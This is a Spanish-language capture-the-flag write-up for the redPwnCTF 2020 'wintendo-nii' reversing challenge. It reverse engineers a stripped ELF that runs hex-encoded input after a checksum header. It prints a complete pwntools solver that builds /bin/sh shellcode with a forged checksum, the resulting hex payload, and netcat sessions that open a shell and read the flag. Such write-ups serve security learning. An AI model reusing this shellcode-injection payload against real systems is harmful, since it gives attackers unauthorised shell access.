# wintendo-nii-reversing redPwnCTF writeup

Reto de la categoria de reversing de redPwnCTF

## File recognition
Observamos que es un ELF 64-bit, que  seguramente es el que se ejecuta en el servicio __2020.redpwnc.tf:31215__

Al observar los stirngs vemos que hay 5 que nos llaman la atencion, al parecer son nombree de juegos

```
root@n0tM4l4f4m4:~/Documents/CTFsGames/2020/redPwnCTF/rev/nii# file nii
nii: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=8def7e412da3017e4dd7fcf2c2d6ad0ac37ba8e4, stripped

root@n0tM4l4f4m4:~/Documents/CTFsGames/2020/redPwnCTF/rev/nii# strings nii
4%d @
%b @
NIIv0.1:H9
TwltPrncH9F
MaroCartH9F
Fitnes++H9F
AmnlXingH9F
%b @
%b @
4%d @
%b @
int main(){puts(flag);}
.shstrtab
.note.gnu.build-id
.text
.data
```

Al correr el programa vemos que nos pide un input y nos muestra uno simbolos chinos que traducidos dicen "En 2020, Wentian Software Company-Todos los derechos reservados.
Por favor inserte el disco del juego", intenamos con un nombre de los juegos que encontramos enlos strings y nada sucede.

```
root@n0tM4l4f4m4:~/Documents/CTFsGames/2020/redPwnCTF/rev/nii# ./nii
二〇二〇年，稳天堂软件公司——版权所有。
请插入游戏磁盘⋯⋯
MaroCart
```

## Analysis

Procedemos a desensamblar el binario en IDa 7.0, al ser un binario stripped no tiene simbolos por lo que nos es un poco mas dificil encontrar el main, sin embargo encontramos el entry_point del programa y empezaremos por ahi.

Vemos las lineas donde el programa recibe el input y lo manda a una funcion que despues de analizar el codigo es una validacion de que sean numeros hexadecimales de los strings que vimos previamente.

Por lo tanto vemos que el input es una codificacion hexadecimal de la version de la "consola" __NIIv0.1:__ concatenado con el nombre de algun juego, lo que quedaria asi __NIIv0.1:MaroCart__

Vemos aqui los pedazos de codigo.

![alt text][img1]
[img1]: https://github.com/mal4f4ma/CTFsGames/blob/master/2020/redPwnCTF/rev/nii/img/ida_1.JPG

![alt text][img2]
[img2]: https://github.com/mal4f4ma/CTFsGames/blob/master/2020/redPwnCTF/rev/nii/img/ida_2.JPG


Despues de pasar esas validaciones hace una operacion mas y posteriormente procede a ejecutar parte del input que va despues del string de la consola y el juego, lo que nos da una idea que a lo mejor el tenemos que pasar un shellcode.

Analizando mas a fondo vemos que es un header del mismo codifo que le estamos pasando, en caso de no ser este la ejecucion temrina.

![alt text][img3]
[img3]: https://github.com/mal4f4ma/CTFsGames/blob/master/2020/redPwnCTF/rev/nii/img/ida_3.JPG

![alt text][img4]
[img4]: https://github.com/mal4f4ma/CTFsGames/blob/master/2020/redPwnCTF/rev/nii/img/ida_.JPG

## Solution

Despues de analizar todo el coodigo vamos a hacer el el solver para la solucion de este problema, vamos a codificar la operacion del header para que nos de el header del shellcode que enviaremos que en este caso nos regresara una shell

```python
#!/usr/bin/python3
#Author: n0tM4l4f4m4
#Title: solver.py

import struct
import codecs
import binascii
from pwn import *

context.arch = "x86_64"
context.endian  = "little"

str_v = 'NIIv0.1:'
game_1 = 'TwltPrnc'
game_2 = 'MaroCart'
game_3 = 'Fitnes++'
game_4 = 'AmnlXing'

shell_ = asm(shellcraft.sh())

checksum = 0

for val in shell_:
    # print(val)
    v7 = val
    # v7 = ord(val)
    for val2 in range(7, -1, -1):
        if checksum >= 0x80000000:
            v10  = 0x80000011
            pass
        else:
            v10 = 0
            pass
        pass
        v12 = 2 * checksum
        v12 = (v12 & 0xffffff00) | (((v7 >> val2) & 1 ^ v12) & 0xff)
        checksum = v10 ^ v12
    pass

header = struct.pack("<L", checksum)

# print(str_v, game_4, header, shell_)
print(binascii.hexlify(bytes(str_v, 'utf-8') + bytes(game_4, 'utf-8') + header + shell_).upper())
```
Ejecutamos el script para que nos de el payload de los que vamos a meter al binario

```
root@n0tM4l4f4m4:~/Documents/CTFsGames/2020/redPwnCTF/rev/nii# python3 solver.py
b'4E494976302E313A416D6E6C58696E673EA050B86A6848B82F62696E2F2F2F73504889E768726901018134240101010131F6566A085E4801E6564889E631D26A3B580F05'
```
Nos vamos a conectar al servico __2020.redpwnc.tf:31215__ por netcat y paseremos el payload que el script nos dio.

```
root@n0tM4l4f4m4:~/Documents/CTFsGames/2020/redPwnCTF/rev/nii# nc 2020.redpwnc.tf 31215
二〇二〇年，稳天堂软件公司——版权所有。
请插入游戏磁盘⋯⋯
4E494976302E313A416D6E6C58696E673EA050B86A6848B82F62696E2F2F2F73504889E768726901018134240101010131F6566A085E4801E6564889E631D26A3B580F05
ls
bin
dev
flag.txt
lib
lib32
lib64
nii

```

Vemos que efectivamente nos devolvio una shell y al usar el comando __ls__ nos devuelve ls lista de archivos donde viene la flag.text

Usaremos el comando __cat__ para leer la flag

```
root@n0tM4l4f4m4:~/Documents/CTFsGames/2020/redPwnCTF/rev/nii# nc 2020.redpwnc.tf 31215
二〇二〇年，稳天堂软件公司——版权所有。
请插入游戏磁盘⋯⋯
4E494976302E313A416D6E6C58696E673EA050B86A6848B82F62696E2F2F2F73504889E768726901018134240101010131F6566A085E4801E6564889E631D26A3B580F05
ls
bin
dev
flag.txt
lib
lib32
lib64
nii
cat flag.txt
It's dangerous to go alone. Take this!
flag{shellcoding_is_a_rev_skill,_too!_8F13E8F6}
```

## Flag
__flag{shellcoding_is_a_rev_skill,_too!_8F13E8F6}__
